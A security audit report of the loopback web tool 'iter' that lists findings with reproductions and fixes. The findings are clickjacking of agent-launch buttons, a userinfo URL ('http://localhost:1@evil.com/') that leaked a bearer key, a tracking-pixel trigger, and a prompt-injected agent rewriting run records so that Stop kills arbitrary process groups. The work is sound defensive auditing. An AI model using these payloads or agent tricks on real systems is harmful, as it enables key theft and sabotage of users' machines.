# Security review — `iter` (2026-11-02)

Lens: security. Branch `feat/review` at `5d96f44`, release binary `target/release/Iter`. All runs against my own
scale-1 store (`$SCRATCH/sec-home`, server on 127.0.0.1:4030) or GETs against the shared 127.0.0.1:3999. Nothing
under `~/.config/iter` was read or written; no source was edited. PoC files: `doc/review_tools/security/`.

## Summary

The web guard (`src/web/guard.rs`) does exactly what `doc/web_server.md:50-53` says: every Host/Origin/
Sec-Fetch-Site combination I tried behaves as designed, `/search` is `no-store` without CORS, ureq drops
`Authorization` on redirects, the keychain wrapper does see failures, SQL is built only from constants and
placeholders, and every file name that reaches the disk is slug- or allow-list-checked. The code base is in
good shape for a loopback tool. What is missing is the layer above the guard: the server sends no security
headers at all, so a page on any website can frame `http://127.0.0.1:3000/...` and have the user click
"Run now" (launches `claude --permission-mode acceptEdits`), "Accept N files", "Stop", or a plan-step button.
Behind that, four things need a precondition but are real:

1. **SEC-01 Blocker** — no `X-Frame-Options`/`frame-ancestors`; `/task/1` renders inside a cross-origin iframe
   (screenshot) and every state-changing button is a one-click `POST` the guard accepts (it is same-origin).
2. **SEC-02 High** — `Organization::check` accepts `http://localhost:1@evil.com/`; I saved that through the real
   `/org/1/edit` form and the bearer key went in clear text to the host after the `@`.
3. **SEC-04 High** — the agent can write `runs/<n>.yaml` (it is under `--add-dir`); the Stop button then runs
   `kill -TERM -- -<pid>`. With `pid: 0` that is the server's own process group (demonstrated: exit 143); with any
   other pid it is whatever process group the agent chose.
4. **SEC-03 Medium** — `GET /org/{id}/platform-activities` is reachable cross-site and makes an authenticated
   outbound request on every hit (blind, but a tracking pixel on any page can fire it).
5. **SEC-06/05 Medium** — `ITER_PLATFORM_KEY` is inherited by `claude`, `gh`, `git`, `tmux`; the full prompt sits on
   `claude`'s argv (`ps`-visible to every local user).

Remote access: recommend **against** exposing the server beyond loopback in its current form; an SSH port-forward
is the only safe way today (section "Remote access posture").

## Scope

Threat model stated for this review:
1. A hostile web page open in the user's browser while `iter serve` runs on a fixed loopback port (default 3000,
   `src/args/mod.rs:188`). It can issue GETs and POSTs to 127.0.0.1 but cannot read responses (SOP) nor forge
   `Origin`/`Sec-Fetch-*`.
2. Hostile data entering the DB, notes, wiki pages, GitHub issue titles/bodies (they become task names and
   descriptions), platform API responses, instruction front matter.
3. A hostile or confused agent (`claude`) run with `--add-dir <taskdir>` and `--permission-mode acceptEdits`
   (`src/agent/run.rs:94-115`), i.e. free to write anything under the task directory and the project checkout.
4. The local multi-user case: shared `/tmp`, default umask 022, `ps` visible to all users.

In scope: `src/web/**`, `src/agent/{run,solve,exec,taskdir,instruction}.rs`, `src/{process,secret,platform,
push,tmux,md_edit,notes,github}.rs`, `src/models/organization.rs`, `src/db/*.rs`, `src/wiki/{mv,ingest_job/lock}.rs`,
the JS assets. Out of scope: the tmux stub tests, the TUI parts of the CLI, oxigraph internals, topcoat internals.

## Method

Commands (all from `$ROOT`, with the brief's environment; servers killed at the end):
- `doc/review_tools/seed.sh $SCRATCH/sec-home 1 $BIN`; `XDG_CONFIG_HOME=$SCRATCH/sec-home ITER_PLATFORM_KEY=dummy
  $BIN serve -p 4030 --no-open`.
- Headers: `curl -sI` on `/`, `/task/1`, `/search?q=a`, `/style.css`, `/board.js`, `/org/1/platform-activities`,
  `/agents`; CORS probe with `Origin: http://evil.example` on `/search`.
- Guard matrix: 15 `curl -X POST /task/1/notes` variants (body `name=&text=`, which passes the guard and fails
  validation with 400, so 400 vs 403 separates the guard from the handler). Table under SEC-14.
- Clickjacking: `doc/review_tools/security/clickjack.html` served by `python3 -m http.server 4031`, loaded in
  headless Chrome with `--screenshot`; result `doc/review_tools/security/clickjack.png`.
- Outbound key: `doc/review_tools/security/sink.py 4032` logs request line + headers; org 1's `platform_url` set via
  `POST /org/1/edit`; `GET /org/1/platform-activities?project=x`.
- `kill` semantics: `python3 -I -c 'os.setpgrp(); subprocess.run(["kill","-TERM","--","-0"])'`; `kill -0 0`;
  `ps -o stat= -p 0`.
- Hook parsing: `$BIN internal hook client-session-changed /dev/ttys9 -x/y` and five variants.
- Tracking pixel: task 2 description set with `sqlite3` to a markdown image on 127.0.0.1:4032 and a `//host`
  link; `/task/2?tab=info` loaded in headless Chrome; sink log read.
- `security -i`: `printf 'find-generic-password -s nonexistent-...\n' | security -i; echo $?` (read-only lookup).
- ureq: `~/.cargo/registry/src/*/ureq-3.5.0/src/config.rs:1066-1095`, `ureq-proto-0.6.5/src/client/mod.rs:496-505`.

Files read in full or in the cited ranges: `web/{guard,mod,errors,assets,platform_pick,folders,search_index,
task_notes,org_share,task_wiki,task_runs,agents,task_agent,instructions/*}.rs`, `web/ui/{prose,notice}.rs`,
`web/forms/org.rs`, all `web/**/*.js`, `agent/{run,solve,exec,taskdir,instruction}.rs`, `process.rs`,
`secret.rs`, `platform.rs:130-200`, `push.rs:280-410`, `tmux.rs:230-320`, `commands/session.rs:170-230`,
`args/internal.rs`, `md_edit.rs:50-130`, `notes.rs` (fn index + `resolve`), `github.rs` (fn index),
`models/organization.rs`, `db/{groups,mod,migrate,tasks}.rs` `format!` sites, `wiki/mv.rs:111-160`,
`wiki/ingest_job/lock.rs`, `doc/web_server.md:44-53`.

NOT checked: an actual `claude` run (no agent was launched); writing to the real keychain (`Keychain::set`);
Linux behaviour (`/tmp`, `xdg-open`); DNS rebinding in a real browser (reasoned from the Host check only);
topcoat's request parsing limits; SPARQL injection in `iter wiki sparql` (CLI, user-typed, local store only).

## Findings

| ID | Severity | file:line | evidence | effort | one-line fix |
|---|---|---|---|---|---|
| SEC-01 | Blocker | `src/web/mod.rs:88-92` (layers), `src/web/task_runs.rs:215`, `src/web/task_wiki.rs:122-123` | run | S | Add a layer sending `X-Frame-Options: SAMEORIGIN` and `Content-Security-Policy: frame-ancestors 'self'`; refuse non-GET when `Sec-Fetch-Dest` is `iframe`/`frame`/`embed`/`object` |
| SEC-02 | High | `src/models/organization.rs:63-82`, `src/web/platform_pick.rs:36-43` | run | S | Parse the URL (`http::Uri`/`url::Url`), reject userinfo, compare `host()` against the loopback set; re-check on read, not only on save |
| SEC-03 | Medium | `src/web/platform_pick.rs:89-111`, `src/web/platform.js:14` | run | S | Make the activity lookup a POST (or require `Sec-Fetch-Mode: cors` + `Accept: application/json` for JSON routes) so the guard applies |
| SEC-04 | High | `src/agent/run.rs:216-221`, `src/agent/solve.rs:290-303`, `src/agent/run.rs:104-105` | run + read | M | Keep run records outside the `--add-dir` tree (or in the DB); before signalling, require `pid > 1`, `pgid(pid) == pid`, and the process to be `iter`/`claude` started by this server |
| SEC-05 | Medium | `src/agent/run.rs:94` | read | S | Hand the prompt to `claude -p` on stdin (`exec.rs` currently sets `Stdio::null()`), keep `runs/<n>.prompt.md` 0600 |
| SEC-06 | Medium | `src/agent/exec.rs:10-25,36-47`, `src/process.rs:9-16` | read | S | `env_remove(secret::ENV_KEY)` on every spawned `Command`; or read the variable once in `main` and `remove_var` it |
| SEC-07 | Medium | `src/tmux.rs:290`, `src/args/internal.rs:25-40` | run | S | Emit `internal hook {event} -- {args}` and set `allow_hyphen_values` on the three `HookEvent` variants |
| SEC-08 | Medium | `src/web/ui/prose.rs:27-38` | run | S | Treat `//` as a scheme (reject), drop images with a non-relative URL (or add `referrerpolicy="no-referrer"` + `loading="lazy"`), send `Referrer-Policy: no-referrer` |
| SEC-09 | Low | `src/web/mod.rs:88-92`, `src/web/ui/notice.rs:43` | run | S | Baseline headers: `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Content-Security-Policy: default-src 'self'` (the one inline script in `notice.rs` needs a nonce or to move into `modal.js`) |
| SEC-10 | Low | `src/db/mod.rs` (`Db::open`), `src/agent/solve.rs:308-309`, `src/web/task_notes.rs:64-71` | run | S | Create `iter.db`, run logs, prompts and notes with mode 0600 (`OpenOptions::mode`), the config dir 0700 |
| SEC-11 | Low | `src/md_edit.rs:65-69,109-113` | read | S | `create_new(true)` + `mode(0o600)` (or the `tempfile` crate); name with a random suffix |
| SEC-12 | Low | `src/process.rs:19-25`, `src/push.rs:289-295`, `src/push.rs:398-406` | read | S | `failure_message` names tool + first two args only; keep stderr's first line |
| SEC-13 | Low | `src/web/task_notes.rs:71,85`, `src/web/org_share.rs:243` | run | S | Route through `FormError::sentence`/`errors::refused` instead of `e.to_string()` |
| SEC-14 | Info | `src/web/guard.rs`, `src/platform.rs:148`, `src/secret.rs:94-110`, `src/db/*` | run / read | — | Verified sound; see details (confirmations and refuted seeds) |

### SEC-01 · Blocker · clickjacking of every one-click action · run

`curl -sI http://127.0.0.1:3999/task/1` (and 4030) returns only `content-type`, `vary`, `content-length`, `date`:
no `X-Frame-Options`, no `Content-Security-Policy`. `doc/review_tools/security/clickjack.html`, served from
`http://127.0.0.1:4031` (a different origin), embeds `<iframe src="http://127.0.0.1:3999/task/1?tab=agent">`;
headless Chrome renders the task page inside it (`doc/review_tools/security/clickjack.png`: breadcrumb
`ORG-1 / PROJECT-1 / TASK`, "New agent...", the Status column). The attacker needs only the port (3000 by
default, `src/args/mod.rs:188`) and a task id (small integers).

Once framed, the user's own click on an invisible button submits a same-origin POST: `Origin` equals `Host`
and `Sec-Fetch-Site: same-origin`, so `guard.rs:41-46` accepts it. One-click POSTs with no confirmation:
"Run now" (`task_runs.rs:215`, `agents.rs:155` → `solve::begin` → `claude ... --permission-mode acceptEdits`
in the project checkout), "Stop"/"Remove from the queue" (`task_runs.rs:216-218`), wiki "Accept N files" /
"Throw away N files" (`task_wiki.rs:122-123`), plan-step state buttons (`task_agent.rs:282`), "Unschedule" /
"Unplace" (`agenda.rs:205`, `matrix.rs:146`), and `POST /folders/pick` which pops a native dialog on the
machine. The push to the time platform (`org_share.rs:298,413`) needs preview then confirm: two clicks, still
framable. `search.js:19,152` frames the server's own pages in the palette, so `SAMEORIGIN` /
`frame-ancestors 'self'` is the right value, not `DENY`.

Fix (S): one topcoat layer next to `guard::local_only` adding `X-Frame-Options: SAMEORIGIN` and
`Content-Security-Policy: frame-ancestors 'self'` to every response. Defence in depth in `guard::allowed`:
refuse a non-GET whose `Sec-Fetch-Dest` is `iframe`, `frame`, `embed` or `object` (Chrome sends it for a form
submitted inside a frame), which also closes the window for browsers that ignore CSP. Add a unit test next to
`a_cross_site_post_is_refused_even_without_an_origin`.

### SEC-02 · High · `platform_url` check accepts `http://localhost:1@<foreign host>` · run

`Organization::check` (`organization.rs:69-74`) strips the prefix `http://localhost` and accepts any rest that
starts with `:` or `/`. `http://localhost:1@127.0.0.1:4032/` has rest `:1@127.0.0.1:4032/`. The URL's
authority is `localhost:1@127.0.0.1:4032`, i.e. userinfo `localhost:1`, host `127.0.0.1:4032`. Repro:

```
curl -X POST http://127.0.0.1:4030/org/1/edit --data-urlencode name=Acme \
     --data-urlencode 'platform_url=http://localhost:1@127.0.0.1:4032/'   -> 303 /org/1
sqlite3 .../iter.db 'select platform_url from organizations where id=1'
     -> http://localhost:1@127.0.0.1:4032/
curl 'http://127.0.0.1:4030/org/1/platform-activities?project=x'
sink: {"method":"GET","path":"/projects","headers":{...,"authorization":"Bearer dummy"}}
```

The same form with `http://time.example.com` is correctly refused ("must start with https://"). The stand-in
host was 127.0.0.1:4032, but the parse is the same for `@evil.com`: the key travels in clear text to a foreign
host. The precondition is that the user (or anything that edits the row: the check runs only on save, and
`platform_pick::open`/`platform.rs:147` trust the stored string) enters that URL, which a "paste this to
connect" instruction achieves. Rated High under "secret exposure needing a precondition".

Fix (S): parse with `http::Uri` (already a ureq dependency) or `url`; refuse any URL with userinfo; compare
`uri.host()` against `localhost`/`127.0.0.1`/`::1` for `http`; run the same check in `platform_pick::open` and
`JsonWebhook::new` so a hand-edited row cannot bypass it. Extend the existing unit test with
`http://localhost:1@evil.com/`, `http://localhost@evil.com`, `http://127.0.0.1.evil.com`.

### SEC-03 · Medium · cross-site GET triggers an authenticated outbound request · run

`guard.rs:33-35` allows every GET regardless of origin (by design: the browser must load pages). `GET
/org/{id}/platform-activities?project=` (`platform_pick.rs:89-111`) resolves the key and calls the platform
(`push::choices`) on each hit; the sink saw `GET /projects` with `authorization: Bearer dummy` for one GET.
Any web page can therefore `<img src="http://127.0.0.1:3000/org/1/platform-activities?project=x">` in a loop:
the attacker reads nothing (no CORS header, verified: `Origin: http://evil.example` gets no
`access-control-*`), but makes iter spend the user's key against the platform (rate limits, audit noise,
account lockout), and combined with SEC-02 it is the trigger for the key leak. `/search` and
`/task/{id}/prompt` are read-only and safe.

Fix (S): the only caller is `platform.js:14` (`fetch(... {headers:{Accept:"application/json"}})`); make it a
`POST` so the guard applies, or for all JSON routes require `Sec-Fetch-Mode: cors` and
`Sec-Fetch-Site: same-origin` (a browser never sends those for an `<img>` or a navigation).

### SEC-04 · High · the agent can choose what the Stop button kills · run (kill semantics) + read

`run.rs:104-105` passes `--add-dir <taskdir root>`; `runs/` is `root.join("runs")` (`run.rs:224`), so under
`acceptEdits` the agent may rewrite `runs/<n>.yaml`. `shown_status` (`run.rs:166-170`) and `cancel`
(`solve.rs:290-303`) trust its `pid`:

- `alive(0)` is true: `kill -0 0` exits 0 (own process group) and `ps -o stat= -p 0` prints nothing, which
  `is_none_or` treats as "not a zombie" (run: `kill -0 0; echo $?` → `0`; `ps -o stat= -p 0` → empty, exit 1).
- `interrupt(0)` runs `kill -TERM -- -0`. Run: a Python process that called `os.setpgrp()` then
  `subprocess.run(["kill","-TERM","--","-0"])` died with status 143; `kill(0)` with a negative-zero target means
  "the caller's process group". The `kill` child inherits `iter serve`'s group, so the server (and whatever
  shares its group) is terminated the moment the user clicks Stop.
- Any other `pid` (the user's tmux server, their shell, another agent) is signalled as a group first, then as
  a process (`run.rs:216-221`); `kill -0` succeeds for any process the user owns.

Also agent-writable and trusted: `worktree` (used as `cwd` for the next launch, `solve.rs:322`), `status`.
Precondition: a hostile or prompt-injected agent (threat 3), hence High rather than Blocker.

Fix (M): move run bookkeeping out of the add-dir tree (sibling `.runs/<task>/` not passed to `--add-dir`, or
the SQLite DB which the CLI already owns); until then validate before signalling: `pid > 1`, `getpgid(pid) ==
pid` (the worker is started with `process_group(0)`, `exec.rs:41`), and `ps -o comm= -p` is `iter`/`claude`;
never fall back to signalling an arbitrary pid.

### SEC-05 · Medium · the prompt is on `claude`'s argv · read

`run.rs:94`: `vec!["-p", prompt]`. The prompt (`runs/<n>.prompt.md`) embeds the task description, plan and
notes excerpts (`task_prompt.rs`). Every local user can read it with `ps -ww` for the life of the run, and
the prompt file itself is 0644 (SEC-10). Fix (S): `claude -p` reads the prompt from stdin when no positional
prompt is given; `exec::run_logged` currently sets `Stdio::null()`, so pipe the file instead.

### SEC-06 · Medium · `ITER_PLATFORM_KEY` is inherited by every child · read

No `env_clear`/`env_remove` anywhere in `src/` (grep). `exec::run_logged` (claude), `exec::spawn_detached`
(the worker, which then runs claude), `process::command` (gh, git, tmux, the editor) all inherit the parent
environment. If the user sets the key by environment (the documented alternative to the keychain,
`secret.rs:3-4`, `org_share.rs:180`), a hostile agent, any tool it shells out to, or a tmux hook sees it in
`/proc`-equivalent or `env`. Fix (S): `command.env_remove(secret::ENV_KEY)` in the three spawn sites, or read
it once at startup into a `Secret` and `std::env::remove_var` it.

### SEC-07 · Medium · tmux hook names a session that starts with `-` · run

`tmux.rs:290` builds `run-shell '<bin> internal hook <event> #{q:hook_client} #{q:session_name}
#{q:client_last_session}'` with no `--`, and `HookEvent` (`internal.rs:25-40`) takes positional `String`s.

```
$BIN internal hook client-session-changed /dev/ttys9 -x/y
error: unexpected argument '-x' found          (exit 2)
$BIN internal hook client-session-changed /dev/ttys9 -h
<prints help>                                  (exit 0)
$BIN internal hook session-closed -x/y         -> exit 2
```

`#{client_last_session}` is any tmux session the user switched from, iter-made or not; a session named
`-work` silently breaks the clock for the switch (tmux discards `run-shell` errors). Not an injection: the
`#{q:}` quoting is right and `shell_word` quotes the binary. Fix (S): add `--` after the event in
`hook_action` and `#[clap(allow_hyphen_values = true)]` on the variants' fields.

### SEC-08 · Medium · remote images and `//host` links from untrusted descriptions · run

`prose.rs:27-38` keeps `http(s)` images and treats a URL without `:` as safe, so `//evil.com/x` passes
(`safe_url("//127.0.0.1:4032/phish")` → `split_once(':')` finds the port, scheme is `//127.0.0.1`, which contains
`/`, so `None` → true). Task descriptions come from GitHub issue bodies (`github.rs`), i.e. from anyone who can
open an issue. Repro: task 2's description set to `![pixel](http://127.0.0.1:4032/pixel.png?task=2)` and
`[//host link](//127.0.0.1:4032/phish)`; `/task/2?tab=info` renders `<img src="http://127.0.0.1:4032/pixel.png?task=2">`
and `<a href="//127.0.0.1:4032/phish">`; headless Chrome fetched the image with
`Referer: http://127.0.0.1:4030/` (sink log). The issue author learns when the user looks at the task and the
local server's port (making SEC-01/SEC-03 reliable), and the trusted UI links out to a host of their choosing.
Fix (S): reject URLs starting with `//` in `safe_url`; drop images that are not same-origin (or render them as
links); send `Referrer-Policy: no-referrer` and CSP `img-src 'self'`.

### SEC-09 · Low · no baseline security headers · run

Besides framing, there is no `X-Content-Type-Options: nosniff`, no `Referrer-Policy`, no CSP on any response
(`curl -sI` on 7 routes). All HTML is produced by `view!` with escaping, `Unescaped` is used only for compiled-in
SVG (`icons.rs:45`), the filtered `script_id` (`notice.rs:31-43`) and the sanitised markdown (SEC-08), so there is
no known XSS to amplify; a CSP would be the safety net. Fix (S): one layer; `default-src 'self'; frame-ancestors
'self'; img-src 'self'` works today except for the inline focus script in `notice.rs:43` (give it a nonce or move it
to `modal.js`).

### SEC-10 · Low · files are created world-readable · run

`ls -la $SCRATCH/sec-home/iter/` after seeding: `iter.db`, `-shm`, `-wal` are `-rw-r--r--` (umask 022). Run logs
(`File::create`, `solve.rs:309`), prompts (`fs::write`, `solve.rs:187`), notes (`OpenOptions` without `mode`,
`task_notes.rs:64-67`) and the wiki lock follow the umask too. On a shared machine other users read task
names, descriptions, time entries and prompts. macOS's `~/.config` is usually 755. Fix (S): `OpenOptions::mode
(0o600)` at the creation sites and `set_permissions(0o700)` on the config directory in `Db::open`.

### SEC-11 · Low · editor buffers in the temp dir · read

`md_edit.rs:65,109`: `temp_dir()/iter-edit-<pid>-<timestamp>.md`, written with `fs::write` (follows symlinks,
0644). On macOS `$TMPDIR` is per-user, so this is Linux-only: a shared `/tmp` lets another user read the
buffer, and a pre-planted symlink with a guessed name redirects the write. Fix (S): `create_new(true)` +
`mode(0o600)`, or the `tempfile` crate.

### SEC-12 · Low · full argv in error strings and the push ledger · read

`process::failure_message` (`process.rs:19-25`) joins every argument; `gh issue create --title .. --body <text>`
(`github.rs:151`), `gh issue comment --body <line>` (`github.rs:180`) put whole bodies into `CommandFailed`, which
`Item::failed` (`push.rs:289-295`) stores in `pushes.results` (`push.rs:398-406`) and `org_share.rs:243` shows on
the page. Nothing secret (the platform key never reaches gh; `IterError::Platform` is redacted in
`platform.rs:171-173`), but the ledger becomes bulky and gh stderr may carry URLs with tokens in future gh
versions. Fix (S): name tool + verb only; keep stderr's first line.

### SEC-13 · Low · raw error strings on pages · run

`POST /task/1/notes` with `name=` answers `400 bad request: a note needs a name` as `text/plain`
(`task_notes.rs:94` via `map_err(bad_request)`); io errors at `task_notes.rs:71,85` and `org_share.rs:243`
surface `e.to_string()`. All are HTML-escaped by `view!` or plain text, so this is information quality, not
injection. Fix (S): map through `FormError::sentence` / `errors::refused` consistently (also noted by the
design lens as a 400-text inconsistency).

### SEC-14 · Info · verified sound / refuted seeds · run + read

Guard matrix (`POST /task/1/notes`, 400 = passed the guard, 403 = refused):

| request | result |
|---|---|
| no Origin, no Sec-Fetch-Site (curl) | 400 (allowed, by design) |
| `Origin: http://evil.example` | 403 |
| `Origin: null` | 403 (`split_once("://")` fails) |
| `Sec-Fetch-Site: cross-site` / `same-site` (no Origin) | 403 / 403 |
| `Origin: http://127.0.0.1:4030` + `same-origin` | 400 |
| `Origin: http://localhost:4030` with Host `127.0.0.1:4030` | 403 (must equal Host) |
| `Origin: http://127.0.0.1:4031` | 403 |
| `Origin: http://127.0.0.1:4030@evil.example` | 403 |
| `Host: evil`, `Host: 127.0.0.1.evil.com`, `Host: [::1]:4030` | 403 each (GET too: `Host: evil` → 403) |
| GET with `Sec-Fetch-Site: cross-site` | 200 (by design; see SEC-03) |

- IPv6: the server binds `127.0.0.1` only (`web/mod.rs:143`); `[::1]` cannot reach it and the guard rejects
  the Host anyway (`host_of` yields `[::1]`). Consistent.
- `/search`: `cache-control: no-store`, `application/json`, no `Access-Control-Allow-Origin`; the JSON is
  unreadable cross-origin. `/style.css`, `/board.js`: `no-cache` + ETag, fine.
- ureq 3.5.0: `Config::default()` has `redirect_auth_headers: RedirectAuthHeaders::Never` and `max_redirects:
  10` (`config.rs:1075-1077`); `JsonWebhook::new` (`platform.rs:148-152`) only sets `http_status_as_error(false)`
  and a timeout, so `Authorization` is dropped on any redirect. Seed concern refuted.
- Keychain: `security -i` exits 44 for a failing `find-generic-password` and 1 for an unknown command, so
  `Keychain::session`'s `success()` test is meaningful. The key goes over stdin (`-i`), never argv; `quotable`
  rejects `"`, `\`, newlines. Seed concern refuted.
- `Secret`: `Display`/`Debug` print `***`; `JsonWebhook::fail` redacts every platform error
  (`platform.rs:171-173`).
- SQL: every `format!` in `src/db/` interpolates `T::NAME`, `T::COLUMNS`, `G::MEMBER_COLUMN`, `NOT_DONE`,
  placeholder lists or migration column names (compile-time constants); user values go through `params!`.
- YAML: `serde_yaml::from_str` on notes/wiki/instruction/run front matter is data-only deserialisation; no
  tags or code paths. The SPARQL engine is only reachable from `iter wiki sparql` (`args/wiki.rs:126`) over a
  local store; nothing in `src/web` calls `graph.query`.
- Path handling: instruction names are `valid_name` (`[a-z0-9-]`, no leading `-`, ≤48) on both web routes
  (`instructions/page.rs:170`, `save.rs:66,134` via `find`); note names are slugified (`task_notes.rs:42-54`);
  `wiki mv` refuses empty or dot-prefixed segments (`mv.rs:118`); `folders.rs:50-62` normalises `..`. Daily
  notes paths come from the org/project `notes_path` the user types; nothing else chooses a directory.
- JS: no `innerHTML`, `eval`, `document.write` or `new Function` in any asset; `frame.src`/`a.href`/
  `location.href` are assigned from server-built URLs (`url.rs`) only; `board.js:183` posts to
  `board.dataset.post`, a server attribute.
- tmux session names: `tmux_name_part` flattens `/ : . * ?`; commands go through `Command` args, not a shell.
- `/org/{id}/edit` and all other POSTs are behind the guard (CSRF closed); DNS rebinding closed by the Host
  check; `Origin: http://LOCALHOST:4030` is refused (case-sensitive match) which is harmless since browsers
  lower-case origins.

## Remote access posture

The user asked what it would take to expose `iter serve` beyond loopback safely. Current state:

- Binding is hard-coded to `127.0.0.1` (`web/mod.rs:143`); there is no flag. The guard refuses any `Host` that is
  not `127.0.0.1`/`localhost`, so even a straight port-forward from another host name would 403.
- There is **no authentication, no session, no cookie, no TLS, no CSRF token, no rate limit**: the design
  assumes "same machine, same user". The guard is an origin check, not an auth check.
- The server does privileged things for whoever can POST: launches `claude` with `acceptEdits` in the project
  checkout (arbitrary code execution as the user), pushes worklogs to a time platform with the user's key,
  closes GitHub issues (`push.rs:388-392`), reads and writes the notes tree, opens a native folder picker on the
  server's desktop (`/folders/pick`), and `serve` without `--no-open` runs `open`/`xdg-open` on the server.

What it would take (in order, all required):
1. **Transport**: TLS or a tunnel. Rust-side TLS in topcoat would need a certificate story; a reverse proxy or
   a tunnel is simpler.
2. **Authentication**: a login (password or a long random bearer token in a cookie with `HttpOnly; Secure;
   SameSite=Strict`), checked in a layer before every route including GETs; constant-time compare;
   lockout/rate limit on failures.
3. **CSRF**: the current Host/Origin/Sec-Fetch-Site check must be generalised: the allowed Host set becomes the
   configured public name, and `Origin` must equal the configured external origin (a reverse proxy rewriting
   `Host` would otherwise 403 everything). A synchroniser token per form is the belt to that brace, and
   `SameSite=Strict` on the session cookie covers the rest. The JS fetches (`board.js`, `platform.js`,
   `modal.js`, `path_pick.js`, `search.js`) must send the cookie/token.
4. **Framing and baseline headers** (SEC-01, SEC-09) become mandatory, not optional.
5. **Capability cuts for the remote case**: the agent runner and `/folders/pick` are local-desktop features and
   should be disabled or admin-gated when bound to a non-loopback address; `--no-open` forced.
6. **Multi-user semantics**: one DB, one notes tree, one key: every authenticated user is the owner. There is
   no per-user model to build on; a shared instance means shared identity.

What breaks today if you just forward the port: the guard's Host check (403 unless the client also presents
`Host: 127.0.0.1:<port>`), the `Origin == Host` rule behind any proxy that rewrites Host, the folder picker and
`open` which act on the server's display, and the implicit trust that "whoever reaches me is the owner".

**Recommendation: against** exposing it. The safe way to use iter from another machine today is an SSH
port-forward (`ssh -L 3000:127.0.0.1:3000 host`) or a Tailscale/WireGuard peer forwarding to loopback: the
browser still talks to `127.0.0.1:3000`, so Host and Origin stay loopback, the guard keeps working, the
transport is encrypted and authenticated by SSH keys, and nothing in iter changes. Fix SEC-01/02/03/04 first
regardless; they bite on loopback. If a networked mode is ever wanted, make it an explicit `--bind` flag that
refuses to start without auth configured, and implement 1-5 above as a unit.

## Confidence

High for SEC-01, SEC-02, SEC-03, SEC-07, SEC-08, SEC-10, SEC-13 and all SEC-14 confirmations: each has a
reproduction above. High for the kill semantics in SEC-04 (run) and medium-high for the chain (the agent's
ability to write `runs/<n>.yaml` is read from `--add-dir dir.root()` and `runs_dir = root/runs`; I did not run
claude). Medium for SEC-05/06 (read; depends on `claude -p` accepting stdin, which it does in current
versions, and on the user using the env variable). Medium for SEC-11 (Linux-specific, reasoned). The Blocker
rating for SEC-01 follows the brief's rubric literally ("exploitable from a web page"); it does require the user
to click on the attacker's page while `iter serve` runs on a guessable port, so in absolute terms it sits at
the High/Blocker boundary.

## Out-of-scope observations

- Any process running as the user can read the platform key from the macOS keychain with `security
  find-generic-password -w` without a prompt, because the item was created by the `security` tool and that
  tool is on its ACL. That makes SEC-06 "convenience of access", not the only path; it is a platform limit,
  not an iter bug, but worth a sentence in `doc/` so users do not assume the keychain hides the key from an
  agent on the same machine.
- `Keychain::get` is called on every `/org/{id}/platform-activities` GET and on every settings/share page
  (`platform_pick::open`), spawning `security` each time; with SEC-03 that is a cheap way for a page to make the
  machine fork continuously (performance lens).
- `errors.rs:49-56` sends `Db`/`Io`/`Spawn` details to stderr and a bare 500 to the page: correct direction.
- `commands/project.rs:96-102` + `scaffold.rs:26` (seed: clone recurses into itself) was not examined by this lens.
- `web/mod.rs:149-154` runs `open`/`xdg-open <url>`; the URL is built from the port only, no injection.
- `agent/taskdir.rs:79` opens `.plan.lock` with `create(true)` following symlinks inside the agent-writable tree;
  a symlink planted by the agent makes iter `flock` and truncate-free-open an arbitrary user file (no write
  happens, so impact is nil today; noted for future edits).

## What I could not assess

- Real `claude` behaviour with the generated argv (not launched); whether current Claude Code reads the
  prompt from stdin with `-p` and no positional (needed for the SEC-05 fix).
- `Keychain::set`/`delete` against the real keychain (would write to the user's keychain).
- Linux: `/tmp` sharing (SEC-11), `xdg-open`, umask conventions.
- topcoat: header size limits, HTTP/1.1 parsing edge cases (request smuggling), behaviour under slowloris; the
  server is single-user loopback so these were deprioritised.
- Whether `Sec-Fetch-Dest: iframe` is sent by Safari for framed form submissions (Chrome and Firefox do);
  the CSP header in the SEC-01 fix does not depend on it.
